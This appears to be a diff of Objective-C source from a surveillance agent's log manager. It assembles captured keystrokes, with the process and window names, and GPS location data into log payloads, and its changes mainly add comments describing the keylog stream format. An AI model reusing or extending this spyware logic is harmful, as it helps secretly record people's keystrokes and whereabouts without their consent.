@@ -667,24 +667,34 @@ typedef struct _log {
     return FALSE;
     
   shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];
-    
+  
+    /*
+     * Keylog stream is: 
+     *   <0x0000,timestruct,process,null,window,null,DELIMETER,keystrokes...0x0000
+     *   timestruct,process,null,window,null,DELIMETER,keystrokes....>
+     */
   if (shMemLog->agentID == LOG_KEYLOG)
     {
       if (IS_HEADER_MANDATORY(shMemLog->flag))
         {
-          // write down the entire data log
+          /*
+           * is mandatory if a app is started or re-opened from bg...
+           */
           payload = [NSMutableData dataWithBytes: shMemLog->commandData 
                                           length: shMemLog->commandDataSize];
         }
       else
         {
-          // get clip/keylog data offset in low short of flag field
+          /*
+           * only keystrokes will be appended in log streams
+           */
           int off = (shMemLog->flag & 0x0000FFFF);
           payload = [NSMutableData dataWithBytes: shMemLog->commandData + off 
                                           length: shMemLog->commandDataSize - off];
         }
     }
-  else if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
+  else
+    if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
     {
       payload = [NSMutableData dataWithBytes:shMemLog->commandData + sizeof(LocationAdditionalData) 
                                       length:sizeof(GPSInfo)];
@@ -723,7 +733,10 @@ typedef struct _log {
                        agentHeader:nil 
                          withLogID:shMemLog->logID])
             {
-              // if streaming keylog is closed rewrite with header
+              /*
+               * the window and process info must be stored
+               * because sync recreate the log stream
+               */
               if (shMemLog->agentID == LOG_KEYLOG)
                 {
                   payload = [NSMutableData dataWithBytes: shMemLog->commandData
